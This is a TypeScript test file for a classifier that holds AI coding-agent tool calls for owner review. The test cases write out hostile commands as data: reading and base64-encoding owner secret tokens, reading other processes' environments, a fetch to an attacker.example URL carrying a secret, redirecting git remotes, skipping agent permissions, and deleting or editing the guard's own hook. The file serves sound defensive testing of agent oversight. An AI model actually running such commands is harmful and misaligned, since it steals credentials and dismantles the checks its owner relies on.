import { describe, expect, test } from "bun:test";
import { exampleCorpProfile } from "../org-profile/fixtures/example-corp.js";
import { classifyToolCall, type FloorProbes } from "./classify.js";
import {
  FLOOR_ALLOW_OPTION,
  FLOOR_GATE,
  FLOOR_HIGH_RISK_LABEL,
  FLOOR_OWNER_GATE,
  OWNER_ONLY_CATEGORIES,
  floorCategoryOf,
  floorQuestion,
  isHighRiskFloorHold,
} from "./gate.js";
import type { FloorCall, FloorCategory, FloorConfig, FloorVerdict } from "./gate.js";
import { decide } from "../persona/policy.js";

/*
 * With Persona's prose holds gone, the worker's safety floor is the only
 * thing between a worker and an outward step. Every owner-only step a worker
 * may try is held here in an owner-only category on gate safety_floor_owner.
 * Persona's allow of such a hold runs the call once, recorded with its reason
 * for the owner to review.
 */

const HOME = "/home/tester";
const DATA = `${HOME}/.local/share/standup`;
const ROOT = `${DATA}/worktrees/standup/feat-1`;
const INSTALL = "/opt/standup";
const FLOOR = `${INSTALL}/packages/collector/src/floor`;
const HOOKS = `${DATA}/worker-hooks`;

const config: FloorConfig = {
  v: 1,
  orgProfile: exampleCorpProfile(),
  collectorUrl: "http://localhost:7777",
  launchId: "launch-1",
  root: ROOT,
  sharedBranches: ["main", "mainline"],
  personalAwsAccounts: [],
  waitSeconds: 60,
  standupDataDir: DATA,
  floorPaths: [FLOOR],
  installDir: INSTALL,
  protectedPaths: [`${DATA}/secrets`],
  tmpDirs: ["/tmp"],
  workerToken: "x".repeat(64),
  replyPublicKey: "test",
};

const FILES: Record<string, string> = {
  [`${ROOT}/package.json`]: JSON.stringify({ scripts: { ship: "git push origin HEAD", test: "bun test", typecheck: "tsc --noEmit" } }),
  [`${ROOT}/Makefile`]: "all: build\nbuild:\n\tbun run build\ndeploy: build\n\tcdk deploy Prod\n",
  [`${ROOT}/release.ts`]: 'import { execSync } from "child_process";\nexecSync("git push origin HEAD");\n',
  [`${ROOT}/report.ts`]: 'await fetch("http://localhost:7777/api/tickets/propose", { method: "POST", body: "{}" });\n',
  [`${ROOT}/.git`]: "gitdir: /srv/standup/.git/worktrees/feat-1\n",
  [`${HOME}/.claude/settings.json`]: "{}",
  [`${FLOOR}/hook.ts`]: "",
};
const DIRS = new Set<string>([ROOT, "/tmp", "/", HOOKS]);
for (const f of Object.keys(FILES)) {
  for (let d = f.slice(0, f.lastIndexOf("/")); d; d = d.slice(0, d.lastIndexOf("/"))) DIRS.add(d);
}
DIRS.delete(`${ROOT}/.git`);

function probes(extra: Partial<FloorProbes> = {}): Partial<FloorProbes> {
  return {
    gitBranch: () => "standup/feat-1",
    gitAlias: () => null,
    gitHooksDir: () => null,
    readFile: (p) => (p in FILES ? { ok: true, text: FILES[p]! } : { ok: false, reason: "missing" }),
    exists: (p) => p in FILES || DIRS.has(p),
    isDirectory: (p) => DIRS.has(p),
    listDir: () => [],
    realpath: (p) => (p in FILES || DIRS.has(p) ? p : null),
    homeDir: () => HOME,
    shellDefinitions: () => ({ aliases: new Map(), functions: new Map() }),
    awsAccount: () => null,
    now: () => Date.now(),
    ...extra,
  };
}

const bash = (command: string, extra?: Partial<FloorProbes>, cwd = ROOT): FloorVerdict =>
  classifyToolCall({ toolName: "Bash", toolInput: { command }, cwd }, config, probes(extra));
const tool = (toolName: string, toolInput: Record<string, unknown>): FloorVerdict =>
  classifyToolCall({ toolName, toolInput, cwd: ROOT }, config, probes());

/** The hold is owner-only, and Persona's "Allow once" on the ask it raises runs the call. */
function expectOwnerOnly(v: FloorVerdict, category?: FloorCategory): void {
  expect(v.action).toBe("hold");
  if (v.action !== "hold") return;
  if (category) expect(v.category).toBe(category);
  expect(OWNER_ONLY_CATEGORIES.has(v.category)).toBe(true);
  expect(v.ownerOnly).toBe(true);
  const allow = decide("answer_ask", {
    owned: true,
    askKind: "ask_human",
    askGate: FLOOR_OWNER_GATE,
    floorCategory: v.category,
    text: FLOOR_ALLOW_OPTION,
  });
  expect(allow.rule).toBe("act");
}

describe("owner-only steps a worker takes are held at the floor", () => {
  const outward: Array<[string, FloorCategory]> = [
    ["git push origin HEAD", "outward"],
    ["git push --force origin feat", "outward"],
    ["git remote set-url origin git@github.com:someone/else.git", "outward"],
    ["git remote remove origin", "outward"],
    ["git remote rename origin old; git remote add origin https://github.com/someone/else.git", "outward"],
    ["bun run ship", "outward"],
    ["npm run ship", "outward"],
    ["bash -c 'git push origin HEAD'", "outward"],
    ["sh -c \"cd /tmp && git push\"", "outward"],
    ["make deploy", "outward"],
    ["bun release.ts", "outward"],
    ["corp-review --draft && git push origin HEAD", "outward"],
    ["corp-env cdk deploy", "outward"],
    ["corp-each -p web cdk deploy MyStack", "outward"],
    ["cdk deploy Prod", "outward"],
    ["npm publish", "outward"],
    ["git merge feat", "outward"],
  ];
  for (const [command, category] of outward) {
    test(`${command} → ${category}`, () => {
      const extra: Partial<FloorProbes> | undefined = command === "git merge feat" ? { gitBranch: () => "main" } : undefined;
      expectOwnerOnly(bash(command, extra), category);
    });
  }

  test("AWS CLI calls that change resources", () => {
    expectOwnerOnly(bash("aws s3 cp out.zip s3://bucket/out.zip"), "aws");
    expectOwnerOnly(bash("aws lambda update-function-code --function-name f --zip-file fileb://f.zip"), "aws");
    expectOwnerOnly(bash("aws cloudformation deploy --stack-name s --template-file t.yml"), "aws");
  });

  test("the collector API", () => {
    expectOwnerOnly(bash("curl -X POST http://localhost:7777/api/launch -d '{}'"), "collector-api");
    expectOwnerOnly(bash("curl -X DELETE http://127.0.0.1:7777/api/sessions/1"), "collector-api");
    expectOwnerOnly(bash("bun report.ts"), "collector-api");
  });

  test("the floor's own files, hook settings and secrets", () => {
    expectOwnerOnly(tool("Write", { file_path: `${FLOOR}/hook.ts`, content: "" }), "floor-tamper");
    expectOwnerOnly(tool("Edit", { file_path: `${HOME}/.claude/settings.json`, old_string: "{}", new_string: "{\"hooks\":{}}" }), "floor-tamper");
    expectOwnerOnly(bash(`echo x > ${FLOOR}/classify.ts`), "floor-tamper");
    expectOwnerOnly(tool("Read", { file_path: `${DATA}/secrets/owner.token` }), "floor-tamper");
  });
});

/**
 * The verdict's ownerReserved flag, the high-risk label it puts on the ask it
 * raises, and what Persona's answer on that ask does: "Allow once" and "Deny"
 * both act, high-risk or not.
 */
function expectReserved(v: FloorVerdict, reserved: boolean, call: FloorCall = { toolName: "Bash", toolInput: { command: "x" }, cwd: ROOT }): void {
  expect(v.action).toBe("hold");
  if (v.action !== "hold") return;
  expect(v.category).toBe("floor-tamper");
  expect(v.ownerOnly).toBe(true);
  expect(v.ownerReserved).toBe(reserved ? true : undefined);
  const question = floorQuestion(call, v);
  expect(isHighRiskFloorHold(question)).toBe(reserved);
  expect(question.includes(FLOOR_HIGH_RISK_LABEL)).toBe(reserved);
  expect(question).not.toContain("Only the owner can allow this");
  const allow = decide("answer_ask", {
    owned: true,
    askKind: "ask_human",
    askGate: FLOOR_OWNER_GATE,
    floorCategory: floorCategoryOf(question),
    ...(isHighRiskFloorHold(question) ? { floorHighRisk: true } : {}),
    text: FLOOR_ALLOW_OPTION,
  });
  expect(allow.rule).toBe("act");
  expect(allow.holdRule).toBeUndefined();
  if (reserved) expect(allow.reason).toContain("high-risk");
  const deny = decide("answer_ask", {
    owned: true,
    askKind: "ask_human",
    askGate: FLOOR_OWNER_GATE,
    floorCategory: "floor-tamper",
    ...(isHighRiskFloorHold(question) ? { floorHighRisk: true } : {}),
    text: "Deny",
  });
  expect(deny.rule).toBe("act");
}

describe("high-risk floor-tamper holds go to Persona, labeled", () => {
  test("reads of owner-side secrets", () => {
    expectReserved(bash(`cat ${DATA}/secrets/owner.token`), true);
    expectReserved(bash(`cat ${DATA}/secrets/floor-reply.key`), true);
    expectReserved(tool("Read", { file_path: `${DATA}/secrets/owner.token` }), true);
    expectReserved(tool("Grep", { pattern: "x", path: `${DATA}/secrets` }), true);
    expectReserved(bash("cd ~/.local/share/standup && base64 secrets/owner.token"), true);
  });

  test("another process's environment, command line or memory", () => {
    expectReserved(bash("cat /proc/1/environ"), true);
    expectReserved(bash("strings /proc/1234/cmdline"), true);
    expectReserved(bash("ps eww"), true);
    expectReserved(bash("gdb -p 1234"), true);
  });

  test("writes to the floor hook or the Standup install", () => {
    expectReserved(tool("Write", { file_path: `${FLOOR}/hook.ts`, content: "" }), true);
    expectReserved(tool("Edit", { file_path: `${FLOOR}/classify.ts`, old_string: "a", new_string: "b" }), true);
    expectReserved(bash(`echo x > ${FLOOR}/classify.ts`), true);
    expectReserved(bash(`rm -rf ${FLOOR}`), true);
    expectReserved(tool("Write", { file_path: `${INSTALL}/packages/collector/src/server.ts`, content: "" }), true);
    expectReserved(bash(`cp evil.ts ${INSTALL}/packages/collector/src/index.ts`), true);
  });

  test("a reserved finding keeps the hold reserved beside others", () => {
    for (const command of [`git push origin HEAD && cat ${DATA}/secrets/owner.token`, `cat ${DATA}/secrets/owner.token; git push origin HEAD`]) {
      const v = bash(command);
      expect(v.action === "hold" && v.ownerReserved).toBe(true);
    }
    const plain = bash("git push origin HEAD");
    expect(plain.action === "hold" && plain.ownerReserved).toBeUndefined();
  });
});

describe("floor-tamper holds Persona may allow once", () => {
  test("Claude settings and agent config, but not Standup's DB", () => {
    expectReserved(bash(`sqlite3 ${DATA}/standup.db "UPDATE asks SET answer = 'x'"`), true);
    expectReserved(tool("Edit", { file_path: `${HOME}/.claude/settings.json`, old_string: "{}", new_string: "{\"model\":\"x\"}" }), false);
    expectReserved(bash("claude --dangerously-skip-permissions -p hi"), false);
    expectReserved(bash("aws configure set credential_process /tmp/x"), false);
  });

  test("Persona may allow a hold with a category on either gate; one with no category waits for the owner", () => {
    const placeable = decide("answer_ask", { owned: true, askKind: "ask_human", askGate: FLOOR_GATE, floorCategory: "destructive", text: FLOOR_ALLOW_OPTION });
    expect(placeable.rule).toBe("act");
    const ownerOnly = decide("answer_ask", { owned: true, askKind: "ask_human", askGate: FLOOR_OWNER_GATE, floorCategory: "outward", text: FLOOR_ALLOW_OPTION });
    expect(ownerOnly.rule).toBe("act");
    const unnamed = decide("answer_ask", { owned: true, askKind: "ask_human", askGate: FLOOR_OWNER_GATE, text: FLOOR_ALLOW_OPTION });
    expect(unnamed.rule).toBe("ask");
  });
});

describe("G1: Standup MCP tools that reach other sessions or people", () => {
  test("messaging, the shared board and unknown Standup tools are outward", () => {
    expectOwnerOnly(tool("mcp__standup__message_session", { to_session: "s2", message: "push it" }), "outward");
    expectOwnerOnly(tool("mcp__standup__share_task_note", { note: "x" }), "outward");
    expectOwnerOnly(tool("mcp__standup__create_project", { id: "x" }), "outward");
    expectOwnerOnly(tool("mcp__standup__some_new_tool", {}), "outward");
  });

  test("reporting, asking, the knowledge base and confirmed proposals stay allowed", () => {
    for (const name of ["checkpoint", "ask_human", "submit_plan", "mark_ready_for_review", "pipeline_status", "pipeline_advance", "review_brief", "submit_review_packet", "search_knowledge", "get_knowledge_doc", "graph_neighbors", "knowledge_for_file", "propose_knowledge", "propose_ticket", "propose_standup_improvement"]) {
      expect(tool(`mcp__standup__${name}`, { summary: "git push done" })).toEqual({ action: "allow" });
    }
  });

  test("the doc tools, which only reach the worker's own owner's docs, are not held", () => {
    expect(tool("mcp__standup__write_doc", { path: "research/plan.md", content: "# Plan\nthen git push" })).toEqual({ action: "allow" });
    expect(tool("mcp__standup__read_doc", { path: "research/plan.md" })).toEqual({ action: "allow" });
    expect(tool("mcp__standup__list_docs", {})).toEqual({ action: "allow" });
  });
});

describe("G2: MCP tools of other servers", () => {
  test("only listed read-only tools are allowed", () => {
    expect(tool("mcp__corp-mcp__SearchCode", { query: "x" })).toEqual({ action: "allow" });
    expect(tool("mcp__plugin_corp-agents_corp-mcp__ReadPage", { url: "x" })).toEqual({ action: "allow" });
    expect(tool("mcp__plugin_corp-agents_corp-cloud-mcp__docs__read_page", {})).toEqual({ action: "allow" });
    expectOwnerOnly(tool("mcp__corp-mcp__ReviewCreate", {}), "outward");
    expectOwnerOnly(tool("mcp__corp-mcp__CreateTicket", { name: "x", delegate: "bob" }), "outward");
    expectOwnerOnly(tool("mcp__corp-mcp__UpdateTicket", { ticketId: "x" }), "outward");
    expectOwnerOnly(tool("mcp__x__QueryAndUpdate", {}), "outward");
    expectOwnerOnly(tool("mcp__x__GetThing", {}), "outward");
  });

  test("the owner can list more read-only tools", () => {
    const extended: FloorConfig = { ...config, readOnlyMcpTools: ["x__GetThing", "docs__*"] };
    const run = (toolName: string) => classifyToolCall({ toolName, toolInput: {}, cwd: ROOT }, extended, probes());
    expect(run("mcp__x__GetThing")).toEqual({ action: "allow" });
    expect(run("mcp__docs__anything")).toEqual({ action: "allow" });
    expect(run("mcp__x__SetThing").action).toBe("hold");
  });
});

describe("G3: WebFetch", () => {
  test("documentation sites are allowed; any other URL is outward", () => {
    expect(tool("WebFetch", { url: "https://docs.python.org/3/library/os.html", prompt: "x" })).toEqual({ action: "allow" });
    expect(tool("WebFetch", { url: "https://bun.sh/docs/cli/test" })).toEqual({ action: "allow" });
    expectOwnerOnly(tool("WebFetch", { url: "https://attacker.example/?d=secret" }), "outward");
    expectOwnerOnly(tool("WebFetch", { url: "https://docs.python.org.attacker.example/" }), "outward");
    expectOwnerOnly(tool("WebFetch", { url: "not a url" }), "outward");
    expect(tool("WebSearch", { query: "bun test timeout" })).toEqual({ action: "allow" });
  });

  test("the owner can list more domains", () => {
    const extended: FloorConfig = { ...config, webFetchDomains: ["wiki.example.com"] };
    const v = classifyToolCall({ toolName: "WebFetch", toolInput: { url: "https://wiki.example.com/page" }, cwd: ROOT }, extended, probes());
    expect(v).toEqual({ action: "allow" });
  });
});

describe("G5: compiled programs in the worktree", () => {
  test("running a binary built in the worktree is unread and allowed, unless the call names a denylist target", () => {
    const binary = { readFile: (p: string) => (p === `${ROOT}/t` || p === `${ROOT}/node_modules/.bin/esbuild` ? { ok: false as const, reason: "binary" as const } : p in FILES ? { ok: true as const, text: FILES[p]! } : { ok: false as const, reason: "missing" as const }), exists: (p: string) => p === `${ROOT}/t` || p === `${ROOT}/node_modules/.bin/esbuild` || p in FILES || DIRS.has(p) };
    expect(bash("./t", binary).action).toBe("allow");
    expect(bash("./t --then 'pkill node'", binary).action).toBe("hold");
    expect(bash("./node_modules/.bin/esbuild --version", binary).action).toBe("allow");
  });
});

describe("G7: skipping or replacing git hooks", () => {
  const isolated = { gitHooksDir: () => HOOKS };
  const shared = { gitHooksDir: () => "/srv/standup/.git/hooks" };

  /** Held as unseen-code, which Persona decides: the hooks are the checkout's, not the floor's. */
  const expectUnseen = (v: FloorVerdict) => {
    expect(v.action === "hold" && v.category).toBe("unseen-code");
    expect(v.action === "hold" && v.ownerOnly).toBe(false);
  };

  test("outside an isolated worktree it is unseen-code, which is allowed unless the call names a denylist target", () => {
    expect(bash("git -c core.hooksPath=/dev/null commit -m x", shared)).toEqual({ action: "allow" });
    expect(bash("git commit --no-verify -m x", shared)).toEqual({ action: "allow" });
    expect(bash("git commit -nm x", shared)).toEqual({ action: "allow" });
    expect(bash("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null git commit -m x", shared)).toEqual({ action: "allow" });
    expectUnseen(bash("git commit --no-verify -m 'x' && echo 'next: tmux kill-server'", shared));
  });

  test("in a worktree whose hooks are Standup's empty dir, turning hooks off is allowed", () => {
    expect(bash("git -c core.hooksPath=/dev/null commit -m x", isolated)).toEqual({ action: "allow" });
    expect(bash("git commit --no-verify -m x", isolated)).toEqual({ action: "allow" });
    expect(bash("git -c core.hooksPath=/home/tester/evil-hooks commit -m x", isolated)).toEqual({ action: "allow" });
  });
});

describe("G10: a Persona worker in place reads the checkout's hooks strictly", () => {
  test("strictHooks reads repo hooks without leniency", () => {
    const hookFiles: Record<string, string> = { ...FILES, [`${ROOT}/.husky/pre-commit`]: "#!/bin/sh\neval \"$HOOK_CMD\"\n" };
    const extra: Partial<FloorProbes> = {
      gitHooksDir: () => `${ROOT}/.husky`,
      readFile: (p) => (p in hookFiles ? { ok: true, text: hookFiles[p]! } : { ok: false, reason: "missing" }),
      exists: (p) => p in hookFiles || DIRS.has(p) || p === `${ROOT}/.husky`,
    };
    const lenient = classifyToolCall({ toolName: "Bash", toolInput: { command: "git commit -m x" }, cwd: ROOT }, config, probes(extra));
    const strict = classifyToolCall({ toolName: "Bash", toolInput: { command: "git commit -m x" }, cwd: ROOT }, { ...config, strictHooks: true }, probes(extra));
    expect(lenient.action).toBe("allow");
    expect(strict.action).toBe("hold");
  });
});
